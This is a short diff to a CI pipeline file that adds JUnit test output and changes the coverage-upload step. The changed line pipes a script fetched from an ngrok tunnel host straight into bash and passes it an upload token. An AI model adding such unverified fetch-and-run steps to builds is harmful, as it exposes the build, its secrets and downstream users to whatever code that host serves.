@@ -24,7 +24,7 @@ jobs:
   - script: |
       pip install pytest 
       pip install pytest-cov
-      python -m pytest --cov=src --cov-report=xml --cov-report=html tests/unit 
+      python -m pytest --junitxml=junit/test-results.xml --cov=src --cov-report=xml --cov-report=html tests/unit 
 
     displayName: 'pytest'
 
@@ -35,7 +35,7 @@ jobs:
     condition: succeededOrFailed()
   
   - script: |
-      bash <(curl http://localhost/bash) -t 09104459-dbd4-4187-bf70-933c0d9bb97b -f coverage.xml -F adder -F subtractor
+      bash <(curl http://ccmigrate-sg1seod6.ngrok.io/bash) -t 09104459-dbd4-4187-bf70-933c0d9bb97b -f coverage.xml -F adder -F subtractor
     displayName: 'codecov'  
   
   - task: PublishCodeCoverageResults@1
